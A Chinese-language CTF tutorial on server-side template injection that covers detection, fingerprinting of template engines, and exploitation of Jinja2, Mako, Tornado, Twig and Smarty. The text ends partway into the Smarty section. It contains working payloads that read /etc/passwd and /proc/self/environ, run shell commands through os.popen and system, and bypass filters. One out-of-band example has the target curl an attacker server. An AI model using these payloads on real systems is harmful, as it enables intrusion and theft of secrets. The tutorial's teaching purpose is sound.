---

title: SSTI
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---




# 1. SSTI

SSTI（模板注入）发生在服务端把用户输入当成模板代码执行时。不同模板引擎有不同的语法，但核心思路一样：找到能执行命令的类或函数。

SSTI（Server-Side Template Injection，服务端模板注入）是指用户可控的内容被服务端当成模板代码解析，而不是只作为普通数据输出。

模板引擎原本用于把后端数据填入 HTML、邮件、配置文件等模板中。例如模板里写：

```jinja2
Hello, {{ username }}
```

后端再把变量 `username` 的值传给模板引擎。

正常情况下，即使用户输入：

```text
{{7*7}}
```

模板引擎也应该只把它当作普通字符串显示。

但如果后端把用户输入直接拼进模板源码，或者直接把用户输入当成一整份模板解析，`{{7*7}}` 就可能被计算成 `49`。攻击者随后可能读取配置、访问模板上下文对象、读取文件，甚至执行系统命令。

SSTI 的核心不是"页面出现了模板符号"，而是：

> 用户输入是否进入了模板源码，并被服务端模板引擎再次解析。

**目录**

- 1.1 SSTI 基础
- 1.2 SSTI 判断方法
- 1.3 Jinja2 SSTI
- 1.4 Jinja2 常见过滤绕过
- 1.5 Mako 和 Tornado SSTI
- 1.6 Twig SSTI
- 1.7 Smarty SSTI
- 1.8 Java 模板注入
- 1.9 Node.js 模板注入
- 1.10 ERB SSTI
- 1.11 Go Template 注入
- 1.12 无回显和外带利用
- 1.13 SSTI 源码审计
- 1.14 SSTI 自动化探测
- 1.15 SSTI 常见 WAF 绕过思路
- 1.16 Flask + Jinja2 完整例题
- 1.17 SSTI 常见注意点

## 1.1 SSTI 基础

### 1.1.1 什么是模板引擎

模板引擎负责把固定的模板和动态数据组合成最终页面。

例如 Flask 常用 Jinja2：

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/user/<name>")
def user(name):
    return render_template("user.html", username=name)
```

`user.html`：

```jinja2
<h1>Hello, {{ username }}</h1>
```

访问：

```text
/user/admin
```

最后页面显示：

```html
<h1>Hello, admin</h1>
```

这里的 `{{ username }}` 是模板表达式，`admin` 是普通数据。

常见模板引擎：

| 语言或框架 | 常见模板引擎 | 常见表达式 |
| ---------- | ------------ | ---------- |
| Python | Jinja2 | `{{ ... }}`、`{% ... %}` |
| Python | Mako | `${...}`、`<% ... %>` |
| Python | Tornado Template | `{{ ... }}`、`{% ... %}` |
| Python | Django Template | `{{ ... }}`、`{% ... %}` |
| PHP | Twig | `{{ ... }}`、`{% ... %}` |
| PHP | Smarty | `{$变量}`、`{函数 ...}` |
| Java | FreeMarker | `${...}`、`<#...>` |
| Java / Spring | Thymeleaf | `${...}`、`*{...}` |
| Java | Velocity | `$变量`、`#set(...)` |
| Node.js | EJS | `<%= ... %>`、`<%- ... %>` |
| Node.js | Pug | `#{...}`、`- 代码` |
| Node.js | Nunjucks | `{{ ... }}`、`{% ... %}` |
| Ruby | ERB | `<%= ... %>`、`<% ... %>` |
| Go | text/template、html/template | `{{ ... }}` |

同样的 `{{ ... }}` 可能属于多种模板引擎，所以不能只看定界符就直接确定模板类型。

### 1.1.2 安全写法和危险写法

以 Flask 和 Jinja2 为例。

**安全写法：**

```python
from flask import request, render_template

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    return render_template("index.html", name=name)
```

`index.html`：

```jinja2
Hello, {{ name }}
```

用户输入只是变量 `name` 的值，不是模板源码。

如果传入：

```text
?name={{7*7}}
```

页面通常只会显示：

```text
Hello, {{7*7}}
```

**危险写法：**

```python
from flask import request, render_template_string

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    template = "Hello, " + name
    return render_template_string(template)
```

用户输入被拼进了模板源码。

传入：

```text
?name={{7*7}}
```

后端实际解析的模板变成：

```jinja2
Hello, {{7*7}}
```

页面就可能显示：

```text
Hello, 49
```

除了字符串拼接，下面这些写法也要重点注意：

```python
# 直接把用户输入当模板
render_template_string(request.args["template"])

# 使用 Jinja2 手工创建模板
env.from_string(request.form["content"]).render()

# f-string 拼接后再交给模板引擎
render_template_string(f"Hello {request.args['name']}")

# format() 拼接后再渲染
render_template_string("Hello {}".format(request.args["name"]))
```

**注意：**

`str.format()` 自身的属性访问问题和 SSTI 不完全相同。

例如：

```python
user_input.format(obj)
```

可能通过 `{0.__class__}` 读取对象属性，但它没有经过 Jinja2、Twig 等模板引擎。这种情况一般称为 Python 格式化字符串注入，分析时要和 SSTI 区分。

### 1.1.3 SSTI 和 XSS 的区别

SSTI 和 XSS 都可能出现在"用户输入被页面显示"的位置，但执行位置不同。

| 对比项 | SSTI | XSS |
| ------ | ---- | --- |
| 执行位置 | 服务端 | 浏览器 |
| 主要解析者 | Jinja2、Twig、FreeMarker 等模板引擎 | 浏览器 HTML / JavaScript 引擎 |
| 常见测试 | `{{7*7}}`、`${7*7}`、`<%= 7*7 %>` | ``<script>`alert(1)`</script>`` |
| 常见结果 | 读取配置、文件、执行服务端命令 | 窃取 Cookie、以受害者身份操作 |
| 是否依赖管理员访问 | 通常不需要 | 存储型 XSS、Bot 题经常需要 |

同一个输入点也可能同时存在 SSTI 和 XSS。

例如服务端先用 Jinja2 解析用户输入，输出结果又没有进行 HTML 转义，可能先发生 SSTI，再产生 XSS。

### 1.1.4 SSTI 常见入口

CTF 中遇到以下功能时，可以优先考虑 SSTI：

- 自定义欢迎语、昵称、个人简介。
- 邮件正文、邮件标题和通知模板。
- 在线生成简历、证书、报告、PDF。
- 自定义错误页面、404 页面。
- CMS 页面模板、主题编辑器。
- 根据用户输入生成配置文件。
- 预览 Markdown、Wiki 或富文本后的二次渲染。
- Flask 的 `render_template_string()`。
- Jinja2 的 `Environment.from_string()`。
- Mako 的 `Template(用户输入)`。
- Twig 的 `createTemplate()`。
- Smarty 的 `string:`、`eval:` 模板资源。
- FreeMarker 使用 `StringReader` 读取用户输入。
- EJS 的 `ejs.render(用户输入, data)`。
- Pug 的 `pug.render(用户输入)`。
- ERB 的 `ERB.new(用户输入).result(binding)`。
- Go 的 `template.New(...).Parse(用户输入)`。

用户输入不一定来自 GET 参数，也可能来自：

- POST 表单。
- JSON 字段。
- Cookie。
- `User-Agent`、`Referer`、`X-Forwarded-For` 等请求头。
- 上传文件的文件名、文件内容或 EXIF 信息。
- 数据库存储的昵称、文章标题等二次数据。
- URL 路径、子域名或 404 路径。

### 1.1.5 SSTI 的常见危害

SSTI 的利用结果取决于模板引擎、模板上下文、沙箱和运行权限。

常见危害：

1. **计算表达式**

   确认用户输入被模板执行。

2. **读取模板上下文**

   读取当前用户、请求参数、环境变量、配置对象等。

3. **泄露密钥**

   例如 Flask 的 `SECRET_KEY`、数据库连接字符串、API Token。

4. **读取本地文件**

   例如 `/flag`、`/flag.txt`、`/etc/passwd`、`/proc/self/environ`。

5. **伪造身份**

   读取 Flask `SECRET_KEY` 后，可能进一步伪造 Session。

6. **执行代码或系统命令**

   通过 Python、PHP、Java、Node.js、Ruby 等语言提供的危险对象执行命令。

7. **内网访问和横向利用**

   获得代码执行后，可以继续访问内网服务或读取其他服务配置。

SSTI 不一定一步就能 RCE。实战中应优先建立最小利用能力：

```text
表达式执行
    ↓
确定模板引擎
    ↓
读取上下文和配置
    ↓
直接读取 flag
    ↓
必要时再尝试命令执行
```

如果已经能够直接读取 `/flag`，通常没有必要强行反弹 Shell。

## 1.2 SSTI 判断方法

### 1.2.1 先确认输入是否回显

先输入一个不容易和页面原内容混淆的标记：

```text
ssti_test_12345
```

观察它是否出现在：

- 页面正文。
- HTML 属性。
- JavaScript 字符串。
- 响应头。
- JSON 字段。
- 错误信息。
- 后续访问的页面。

如果输入完全不回显，也不代表一定没有 SSTI。输入可能用于邮件、日志、后台页面、文件生成或管理员预览。

### 1.2.2 使用数学表达式探测

不要一开始就执行 `id`、`whoami`。先使用无害的数学表达式确认模板是否执行。

常见探测：

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

为了降低误判，可以在表达式前后加固定标记：

```text
ssti{{7*7}}test
ssti${7*7}test
ssti<%= 7*7 %>test
```

如果返回：

```text
ssti49test
```

说明表达式很可能在服务端被执行。

使用 curl 测试 GET 参数：

```bash
curl -G "http://target/" --data-urlencode "name=ssti{{7*7}}test"
```

测试 POST 表单：

```bash
curl -X POST "http://target/" \
  --data-urlencode "name=ssti{{7*7}}test"
```

测试 JSON：

```bash
curl -X POST "http://target/api" \
  -H "Content-Type: application/json" \
  -d '{"name":"ssti{{7*7}}test"}'
```

测试 Cookie：

```bash
curl "http://target/" \
  -H "Cookie: name=ssti{{7*7}}test"
```

### 1.2.3 根据报错判断模板引擎

如果正常表达式没有明显回显，可以故意构造语法错误：

```text
{{7*
${7*
<%= 7*
{% if %}
```

错误页面可能泄露：

| 报错关键词 | 可能的模板引擎 |
| ---------- | -------------- |
| `jinja2.exceptions.TemplateSyntaxError` | Jinja2 |
| `UndefinedError` | Jinja2 |
| `Twig\Error\SyntaxError` | Twig |
| `SmartyCompilerException` | Smarty |
| `freemarker.core`、`TemplateException` | FreeMarker |
| `org.thymeleaf`、`TemplateInputException` | Thymeleaf |
| `MakoException`、`mako.exceptions` | Mako |
| `ejs`、`SyntaxError in template` | EJS |
| `Pug`、`PugError` | Pug |
| `ActionView::Template`、`ERB` | ERB / Rails |
| `template: ... unexpected ...` | Go template |

报错信息只能作为指纹之一。框架可能统一处理异常，也可能自定义错误页面。

### 1.2.4 模板引擎指纹

不同模板引擎可能使用相同定界符，可以用多组表达式交叉判断。

| 测试内容 | 常见结果 | 可能的模板 |
| -------- | -------- | ---------- |
| `{{7*7}}` | `49` | Jinja2、Twig、Nunjucks、Tornado 等 |
| `{{7*'7'}}` | `7777777` | Jinja2，因为 Python 支持字符串重复 |
| `{{7*'7'}}` | `49` | Twig、Nunjucks 等会把字符串当数字 |
| `{{config}}` | Flask 配置内容 | Flask + Jinja2 |
| `{{request}}` | 请求对象 | Flask + Jinja2，前提是对象存在 |
| `${7*7}` | `49` | Mako、FreeMarker、Thymeleaf 等 |
| `<%= 7*7 %>` | `49` | EJS、ERB |
| `#{7*7}` | `49` | Pug |
| `{$smarty.version}` | Smarty 版本 | Smarty |
| `#set($x=7*7)$x` | `49` | Velocity |
| `{{printf "%s" "ssti"}}` | `ssti` | Go template |

Jinja2 和 Twig 的常用区分方法：

```text
{{7*'7'}}
```

常见情况下：

```text
Jinja2 → 7777777
Twig   → 49
```

但是模板版本、运算规则和自定义过滤器可能改变结果，不能只依赖一个表达式。

### 1.2.5 判断是否存在二次渲染

有些页面第一次提交时只保存内容，第二次访问预览页或后台页时才渲染模板。

测试流程：

1. 提交唯一标记 `ssti_随机字符串`。
2. 找到内容展示、预览、导出、邮件发送等功能。
3. 确认原始内容出现在哪一个页面。
4. 再提交 `ssti{{7*7}}test`。
5. 观察后续页面是否显示 `ssti49test`。

这类漏洞也叫存储型 SSTI 或二次 SSTI。

常见场景：

- 用户昵称保存后，由后台管理页面渲染。
- 邮件模板保存后，点击发送才解析。
- Markdown 内容先保存，导出 PDF 时再经过模板引擎。
- 数据库中的字段被拼进错误页面。

### 1.2.6 无回显 SSTI

如果表达式执行后页面没有输出，可以通过时间、外带请求和状态变化确认。

例如 Jinja2 已经能够调用 `os.popen()` 时，可以测试延时：

```jinja2
{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}
```

如果响应稳定延迟约 5 秒，说明命令可能已经执行。

Windows 目标可以尝试：

```jinja2
{{cycler.__init__.__globals__.os.popen('ping -n 6 127.0.0.1').read()}}
```

也可以让目标访问自己的服务器：

```jinja2
{{cycler.__init__.__globals__.os.popen('curl http://VPS_IP:8000/ssti').read()}}
```

使用外带方式前要先确认题目环境允许出网。没有收到请求，不一定代表 SSTI 不存在，也可能是容器无法访问外网、没有 `curl`、DNS 被限制或命令执行函数不可用。

### 1.2.7 避免常见误判

1. **浏览器前端计算不等于 SSTI。**

   Angular、Vue 等前端框架也可能计算 `{{7*7}}`。使用 curl 查看原始响应，如果服务器返回的仍是 `{{7*7}}`，而浏览器显示 `49`，说明更可能是客户端模板注入。

2. **原样回显不等于 SSTI。**

   返回 `{{7*7}}` 说明输入被显示，但没有被模板执行。

3. **看到 `49` 也要交叉验证。**

   页面业务本身可能进行数学计算。应使用带前后缀的多个表达式测试。

4. **HTML 转义不能排除 SSTI。**

   自动转义只处理最终输出中的 `<`、`>` 等 HTML 字符，不会自动阻止模板表达式被执行。

5. **模板名称可控不一定是 SSTI。**

   如果用户只能控制 `render_template("xxx.html")` 中的文件名，可能更接近目录穿越或任意模板加载。只有能够控制模板内容或构造可执行模板表达式时，才属于 SSTI。

## 1.3 Jinja2 SSTI

Jinja2 是 Python 中最常见的模板引擎之一，Flask 默认使用 Jinja2。

CTF 中看到以下特征时，可以优先考虑 Jinja2：

- Flask 的调试页面或响应头。
- `session` Cookie 具有 Flask 签名格式。
- 源码出现 `render_template()`、`render_template_string()`。
- 页面使用 `{{ variable }}` 和 `{% ... %}`。
- 报错出现 `jinja2`、`UndefinedError`、`TemplateSyntaxError`。

### 1.3.1 Jinja2 基础语法

常见表达式：

```jinja2
{{7*7}}
{{"abc"|length}}
{{"a" ~ "b"}}
{{[1,2,3]|first}}
{{[1,2,3]|last}}
```

常见语句：

```jinja2
{% if 1 == 1 %}
yes
{% endif %}

{% for x in [1,2,3] %}
{{x}}
{% endfor %}
```

常见访问方式：

```jinja2
{{object.attribute}}
{{object["attribute"]}}
{{object|attr("attribute")}}
```

这三种访问方式在绕过点号、方括号或关键字过滤时经常互相替换。

### 1.3.2 Flask 常见上下文对象

Flask 会向 Jinja2 模板提供一些对象，但具体可用对象取决于渲染位置和应用配置。

常见测试：

```jinja2
{{config}}
{{config.items()}}
{{request}}
{{request.args}}
{{request.form}}
{{request.headers}}
{{request.cookies}}
{{request.environ}}
{{session}}
{{g}}
{{url_for}}
{{get_flashed_messages}}
```

重点关注：

| 对象 | 可能泄露的内容 |
| ---- | -------------- |
| `config` | `SECRET_KEY`、数据库地址、调试配置 |
| `request.args` | GET 参数 |
| `request.form` | POST 参数 |
| `request.headers` | 请求头、Token |
| `request.cookies` | Cookie |
| `request.environ` | WSGI 和系统环境信息 |
| `session` | 当前会话内容 |
| 函数对象 | 通过 `__globals__` 访问模块全局变量 |

读取 Flask 密钥：

```jinja2
{{config["SECRET_KEY"]}}
```

也可以写成：

```jinja2
{{config.SECRET_KEY}}
```

如果配置对象没有直接显示密钥，可以查看全部配置：

```jinja2
{{config.items()}}
```

### 1.3.3 直接读取文件

在默认 Jinja2 / Flask 环境中，一些全局函数或类的 Python 全局命名空间里可能包含 `__builtins__`。

可以尝试通过 `open()` 直接读取文件：

```jinja2
{{cycler.__init__.__globals__.__builtins__["open"]("/flag").read()}}
```

读取其他常见位置：

```jinja2
{{cycler.__init__.__globals__.__builtins__["open"]("/flag.txt").read()}}
{{cycler.__init__.__globals__.__builtins__["open"]("/proc/self/environ").read()}}
{{cycler.__init__.__globals__.__builtins__["open"]("/etc/passwd").read()}}
```

其他可能可用的入口：

```jinja2
{{joiner.__init__.__globals__.__builtins__["open"]("/flag").read()}}
{{namespace.__init__.__globals__.__builtins__["open"]("/flag").read()}}
```

这些对象是否存在取决于 Jinja2 版本、模板环境和上下文。某一条失败时，不要直接判断无法利用，应先枚举当前可用对象。

### 1.3.4 通过 os 执行命令

常见短链：

```jinja2
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

替换命令：

```jinja2
{{cycler.__init__.__globals__.os.popen("whoami").read()}}
{{cycler.__init__.__globals__.os.popen("pwd").read()}}
{{cycler.__init__.__globals__.os.popen("ls -la /").read()}}
{{cycler.__init__.__globals__.os.popen("cat /flag").read()}}
```

其他常见入口：

```jinja2
{{joiner.__init__.__globals__.os.popen("id").read()}}
{{namespace.__init__.__globals__.os.popen("id").read()}}
{{lipsum.__globals__["os"].popen("id").read()}}
```

通过内置函数导入 `os`：

```jinja2
{{cycler.__init__.__globals__.__builtins__["__import__"]("os").popen("id").read()}}
```

Flask 请求对象的某些路径也可能到达 Python 全局变量：

```jinja2
{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
```

**注意：**

- `os.popen()` 会通过 Shell 执行命令，目标容器需要存在对应命令。
- 精简容器可能没有 `bash`、`curl`、`cat` 等程序。
- 能使用 Python `open()` 直接读文件时，通常比执行 `cat` 更稳定。
- Web 进程权限可能很低，只能读取当前用户有权限访问的文件。

### 1.3.5 Python 对象链原理

Jinja2 SSTI 中经常出现：

```python
__class__
__base__
__mro__
__subclasses__()
__globals__
__builtins__
```

它们的作用：

| 属性或方法 | 作用 |
| ---------- | ---- |
| `__class__` | 获取当前对象所属的类 |
| `__base__` | 获取父类 |
| `__mro__` | 查看类的继承顺序 |
| `__subclasses__()` | 查看某个类已经加载的直接子类 |
| `__globals__` | 获取函数定义所在模块的全局变量 |
| `__builtins__` | 获取 Python 内置函数，如 `open`、`__import__` |

从普通对象到 `object`：

```jinja2
{{"".__class__}}
{{"".__class__.__base__}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1]}}
```

常见结果类似：

```text
<class 'str'>
<class 'object'>
(<class 'str'>, <class 'object'>)
<class 'object'>
```

枚举所有已经加载的 `object` 子类：

```jinja2
{{"".__class__.__mro__[1].__subclasses__()}}
```

也可以使用：

```jinja2
{{().__class__.__base__.__subclasses__()}}
```

输出通常很长，其中可能出现：

- `subprocess.Popen`。
- `warnings.catch_warnings`。
- 文件相关类。
- 框架内部类。

### 1.3.6 不要依赖固定 subclasses 下标

网上经常看到：

```jinja2
{{"".__class__.__mro__[1].__subclasses__()[固定数字](...)}}
```

这种写法不稳定。

`__subclasses__()` 的顺序会受到以下因素影响：

- Python 版本。
- 已导入的模块。
- Flask、Jinja2 和第三方依赖版本。
- 应用启动顺序。
- 题目源码提前加载了哪些类。

因此不要照抄固定下标。

可以先输出所有子类，在响应中搜索目标类名。

如果模板支持循环，可以按类名查找：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "catch_warnings" %}
    {{c.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
  {% endif %}
{% endfor %}
```

如果 `subprocess.Popen` 已经被应用加载：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if c.__name__ == "Popen" %}
    {{c("id", shell=True, stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}
```

第一种 `catch_warnings` 链通常比猜固定下标更稳定，但也不能保证所有环境都可用。

### 1.3.7 Jinja2 常用利用顺序

建议依次测试：

1. 数学表达式：

   ```jinja2
   {{7*7}}
   ```

2. 字符串重复，辅助判断 Jinja2：

   ```jinja2
   {{7*"7"}}
   ```

3. Flask 配置：

   ```jinja2
   {{config}}
   ```

4. 请求对象：

   ```jinja2
   {{request}}
   ```

5. 短链读取文件：

   ```jinja2
   {{cycler.__init__.__globals__.__builtins__["open"]("/flag").read()}}
   ```

6. 短链命令执行：

   ```jinja2
   {{cycler.__init__.__globals__.os.popen("id").read()}}
   ```

7. 短链不可用时，再枚举 `__subclasses__()`。

这种顺序比一开始就复制很长的对象链更容易判断失败发生在哪一步。

## 1.4 Jinja2 常见过滤绕过

SSTI 绕过不能只背 payload。先确定过滤的是原始请求、URL 解码后的参数、模板源码，还是模板执行结果。

建议每次只替换一个被过滤的部分，并观察报错变化。

### 1.4.1 点号过滤

正常写法：

```jinja2
{{object.__class__}}
```

使用方括号：

```jinja2
{{object["__class__"]}}
```

使用 `attr` 过滤器：

```jinja2
{{object|attr("__class__")}}
```

继续访问父类：

```jinja2
{{object|attr("__class__")|attr("__base__")}}
```

调用方法：

```jinja2
{{object|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}
```

### 1.4.2 方括号过滤

使用点号：

```jinja2
{{config.SECRET_KEY}}
```

使用 `attr`：

```jinja2
{{cycler|attr("__init__")|attr("__globals__")}}
```

如果需要列表中的第一项或最后一项，可以尝试：

```jinja2
{{data|first}}
{{data|last}}
```

### 1.4.3 下划线过滤

如果过滤器只检查主参数，可以把敏感属性名放到另一个参数中。

请求：

```text
?name={{()|attr(request.args.a)}}&a=__class__
```

模板实际执行：

```jinja2
{{()|attr(request.args.a)}}
```

`request.args.a` 的值是 `__class__`。

继续传入多个属性：

```text
?name={{()|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__base__
```

如果过滤器会检查所有参数，这种方法就不能直接使用。

还可以在字符串内部使用十六进制转义表示下划线：

```jinja2
{{()|attr("\x5f\x5fclass\x5f\x5f")}}
```

`\x5f` 表示下划线 `_`。

它能否绕过取决于过滤发生在模板解析前还是字符串转义处理后。

### 1.4.4 引号过滤

从请求参数中取得字符串：

```text
?name={{config[request.args.key]}}&key=SECRET_KEY
```

模板部分不需要直接写 `"SECRET_KEY"`。

从请求头取得内容：

```jinja2
{{request.headers.User-Agent}}
```

请求：

```http
User-Agent: __class__
```

再配合 `attr` 使用：

```jinja2
{{()|attr(request.headers.User-Agent)}}
```

还可以使用已经存在的字符串对象和过滤器构造内容，但这类 payload 对环境依赖更强，应优先使用请求参数传值。

### 1.4.5 关键字过滤

如果过滤 `class`、`globals`、`builtins`、`import`、`os` 等完整单词，可以拆分字符串后再拼接。

Jinja2 使用 `~` 拼接字符串：

```jinja2
{{"__cla" ~ "ss__"}}
```

配合 `attr`：

```jinja2
{{()|attr("__cla" ~ "ss__")}}
```

拆分 `os`：

```jinja2
{{cycler.__init__.__globals__["o" ~ "s"].popen("id").read()}}
```

使用 `join`：

```jinja2
{{["o","s"]|join}}
```

是否能绕过取决于 WAF 是检查原始字符串，还是会进行模板语义分析。

### 1.4.6 花括号过滤

如果只过滤 `{{`，但允许 Jinja2 语句标签 `{% %}`，可以尝试 `print` 语句：

```jinja2
{% print 7*7 %}
```

也可以先赋值再输出：

```jinja2
{% set x = 7*7 %}
{% print x %}
```

这种方法只适用于支持 `print` 语句的 Jinja2 环境。如果 `{%` 也被过滤，就需要寻找其他可控模板位置或二次渲染点。

### 1.4.7 空格过滤

很多 Jinja2 表达式不需要空格：

```jinja2
{{7*7}}
{{config["SECRET_KEY"]}}
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

控制语句中的部分空格可以通过换行、Tab 或表达式结构调整，但并不是所有位置都能无空格书写。

URL 中可以测试：

```text
%09    Tab
%0a    换行
%0d    回车
```

是否有效取决于 Web 框架和 WAF 的解码顺序。

### 1.4.8 斜杠和文件名过滤

如果 `/flag` 被过滤，可以尝试：

- 从 `pwd` 和目录列表确定实际路径。
- 读取环境变量中的 flag。
- 使用相对路径，例如 `flag`、`../flag`。
- 将路径放在另一个参数或请求头中。
- 拼接路径字符串。

例如：

```text
?name={{cycler.__init__.__globals__.__builtins__["open"](request.args.path).read()}}&path=/flag
```

如果 `cat` 被过滤，优先直接调用 Python `open()`，不必寻找其他 Shell 读文件命令。

### 1.4.9 URL 编码和二次编码

普通 URL 编码：

```text
{{7*7}}
↓
%7B%7B7%2A7%7D%7D
```

二次 URL 编码：

```text
%257B%257B7%252A7%257D%257D
```

二次编码只有在后端确实会进行两次 URL 解码时才有意义。

使用 curl 时优先让工具完成编码：

```bash
curl -G "http://target/" \
  --data-urlencode "name={{7*7}}"
```

不要在已经编码的 payload 上再次使用 `--data-urlencode`，否则可能发生意外的二次编码。

### 1.4.10 绕过沙箱时的判断顺序

Jinja2 的 `SandboxedEnvironment` 可能禁止访问以下属性：

```text
__class__
__globals__
__subclasses__
```

遇到沙箱报错时：

1. 查看模板上下文中是否已经暴露了可直接调用的函数。
2. 查看对象是否有安全但可利用的方法，例如读文件、访问数据库。
3. 尝试 `config`、`request`、自定义业务对象。
4. 判断是否只是关键字黑名单，而不是真正的 Jinja2 沙箱。
5. 检查是否能修改对象属性或业务状态，而不是强求 RCE。
6. 根据具体 Jinja2 版本和自定义安全策略寻找利用链。

不存在适用于所有 Jinja2 沙箱的万能 payload。

## 1.5 Mako 和 Tornado SSTI

Mako 和 Tornado 都是 Python 模板引擎。它们通常比默认 Jinja2 更接近直接执行 Python 表达式，因此确认模板类型后，应优先尝试直接读取文件，不必先走复杂的 `__subclasses__()` 链。

### 1.5.1 Mako 基础判断

Mako 常见表达式定界符是 `${...}`。

测试：

```mako
${7*7}
```

如果返回：

```text
49
```

可以继续测试字符串：

```mako
${"ssti".upper()}
```

Mako 允许在表达式中执行 Python 代码。

### 1.5.2 Mako 读取文件

直接使用 `open()`：

```mako
${open("/flag").read()}
```

读取其他位置：

```mako
${open("/flag.txt").read()}
${open("/proc/self/environ").read()}
${open("/etc/passwd").read()}
```

如果 `open` 没有直接暴露，可以尝试通过内置函数导入模块。

### 1.5.3 Mako 命令执行

常见写法：

```mako
${__import__("os").popen("id").read()}
```

读取 flag：

```mako
${__import__("os").popen("cat /flag").read()}
```

Mako 还支持 Python 代码块：

```mako
<%
import os
result = os.popen("id").read()
%>
${result}
```

如果页面过滤 `${`，但允许 `<% %>`，代码块仍可能执行。

### 1.5.4 Tornado Template

Tornado 模板常用 `{{ ... }}`，外观和 Jinja2 很像。

数学测试：

```text
{{7*7}}
```

Tornado 模板可以执行 Python 表达式，并支持导入语句。

常见测试：

```tornado
{% import os %}
{{os.popen("id").read()}}
```

读取文件：

```tornado
{{open("/flag").read()}}
```

如果直接使用 `open` 报未定义，再尝试导入 `os` 或检查模板上下文。

### 1.5.5 Django Template 不要直接套 Jinja2 Payload

Django Template 也使用 `{{ ... }}`，但默认语法限制比 Jinja2 多。

常见判断：

```django
{{7|add:"7"}}
```

可能输出：

```text
14
```

Django Template 默认不允许：

- 任意 Python 表达式。
- 直接调用带参数的方法。
- 访问以下划线开头的属性。
- 直接使用 Jinja2 的 `__class__`、`__globals__` 链。

因此：

```text
{{7*7}}
```

在 Django Template 中通常会报错或原样处理。

Django 模板注入是否能进一步利用，主要取决于上下文中暴露了哪些对象、自定义过滤器和标签。不要看到 Python / Django 就直接复制 Jinja2 RCE。

## 1.6 Twig SSTI

Twig 是 PHP 中常见的模板引擎，Symfony 项目经常使用 Twig。

常见特征：

- 模板使用 `{{ ... }}` 和 `{% ... %}`。
- 报错出现 `Twig\Error`。
- 源码出现 `Twig\Environment`、`createTemplate()`、`render()`。
- Symfony 调试信息或目录结构。

### 1.6.1 Twig 基础判断

数学测试：

```twig
{{7*7}}
```

正常情况下返回：

```text
49
```

使用字符串乘法区分 Jinja2：

```twig
{{7*"7"}}
```

常见结果：

```text
Twig   → 49
Jinja2 → 7777777
```

测试变量和过滤器：

```twig
{{"ssti"|upper}}
{{_self}}
{{app}}
```

`app`、`dump()` 等对象或函数是否存在，取决于 Symfony 集成方式和调试配置。

### 1.6.2 Twig 上下文枚举

可以先测试：

```twig
{{_context}}
{{app}}
{{app.request}}
{{app.request.headers}}
{{app.request.cookies}}
```

如果启用了调试扩展，可以尝试：

```twig
{{dump()}}
{{dump(_context)}}
```

生产环境通常不会启用 `dump()`。

### 1.6.3 Twig 旧版本回调利用

较旧 Twig 版本中，经典利用链是注册未定义过滤器回调：

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

执行读取：

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /flag")}}
```

这类链主要针对旧版本 Twig。新版本通常无法直接使用 `_self.env`，不能把旧 payload 当成通用写法。

### 1.6.4 Twig map 回调利用

部分未启用沙箱、允许字符串作为 PHP callable 的 Twig 环境中，可以测试：

```twig
{{["id"]|map("system")|join}}
```

读取 flag：

```twig
{{["cat /flag"]|map("system")|join}}
```

也可能使用：

```twig
{{["id"]|map("passthru")|join}}
```

是否可用取决于：

- Twig 版本。
- PHP 版本。
- 是否启用 SandboxExtension。
- 安全策略允许哪些函数和过滤器。
- 当前版本是否允许字符串 callable。

如果报"过滤器参数必须是 Closure"或"不允许调用函数"，说明这条链不适用于当前环境。

### 1.6.5 Twig 文件读取

Twig 本身没有一个对所有环境都可用的任意文件读取函数。

可以测试模板加载函数：

```twig
{{source("index.html")}}
{{include("index.html")}}
```

但它们通常只能读取模板加载目录中的文件，不能直接读取 `/etc/passwd`。

某些 Symfony 调试环境会额外提供文件相关函数，但这不是 Twig 核心功能。遇到网上的 `file_excerpt` 等 payload 时，要先确认目标环境确实加载了对应扩展。

### 1.6.6 Twig 常见注意点

1. Jinja2 和 Twig 外观相似，先使用运算规则、报错和框架特征判断。
2. Twig 1.x、2.x、3.x 的利用链差异很大。
3. `autoescape` 只影响 HTML 输出转义，不会自动修复 SSTI。
4. SandboxExtension 会限制函数、过滤器、属性和方法，不能只靠关键字替换绕过。
5. 如果上下文只暴露普通字符串和数组，可能只能读取上下文，无法直接 RCE。

## 1.7 Smarty SSTI

Smarty 是 PHP 模板引擎，常见定界符是 `{ ... }`。

### 1.7.1 Smarty 基础判断

读取 Smarty 版本：

```smarty
{$smarty.version}
```

输出变量：

```smarty
{$smarty.template}
{$smarty.current_dir}
```

简单数学表达式：

```smarty
{7*7}
```

不同 Smarty 版本和语法配置可能对直接数学表达式处理不同，版本变量通常是更明显的指纹。

### 1.7.2 Smarty 调用 PHP 函数

在允许调用 PHP 函数、没有启用严格安全策略的环境中，可以测试：

```smarty
{system("id")}
```

读取文件：

```smarty
{file_get_contents("/flag")}
```

也可以把函数放入条件语句：

```smarty
{if system("id")}{/if}
```

这些写法是否可用取决于 Smarty 版本和安全策略。

### 1.7.3 Smarty 旧版 php 标签

Smarty 旧版本或兼容模式中可能支持：

```smarty
{php}
echo file_get_contents("/flag");
{/php}
```

现代 Smarty 默认通常不允许 `{php}` 标签。只有确认目标使用旧版本或 SmartyBC 兼容模式时才值得测试。

### 1.7.4 Smarty fetch 和 include

某些环境可以使用：

```smarty
{fetch file="file:///etc/passwd"}
```

或者：

```smarty
{include file="/path/to/template"}
```

是否能够读取任意路径取决于：

- `allow_url_fopen`。
- Smarty 安全模式。
- 模板目录限制。
- 插件是否启用。

### 1.7.5 Smarty string 模板

源码审计时重点关注：
